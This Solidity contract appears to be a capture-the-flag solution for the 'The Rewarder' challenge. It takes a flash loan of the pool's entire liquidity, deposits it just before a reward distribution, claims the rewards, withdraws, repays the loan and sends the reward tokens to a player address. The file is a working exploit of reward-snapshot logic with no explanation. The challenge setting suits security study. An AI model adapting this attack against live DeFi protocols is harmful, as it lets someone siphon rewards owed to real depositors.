pragma solidity ^0.8.4;

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";

import "hardhat/console.sol";

contract TheRewarderExploiter {
    FlashLoanerPool flp;
    TheRewarderPool trp;

    function exploit(address loaner, address rewarder, address player) external {
        flp = FlashLoanerPool(loaner);
        trp = TheRewarderPool(rewarder);

        uint256 balance = flp.liquidityToken().balanceOf(loaner);
        flp.flashLoan(balance);

        uint256 rewardsBalance = trp.rewardToken().balanceOf(address(this));
        trp.rewardToken().transfer(player, rewardsBalance);
    }

    function receiveFlashLoan(uint256 amount) external {
        flp.liquidityToken().approve(address(trp), amount);
        trp.deposit(amount);
        
        trp.distributeRewards();
        trp.withdraw(amount);
        flp.liquidityToken().transfer(msg.sender, amount);
    }
}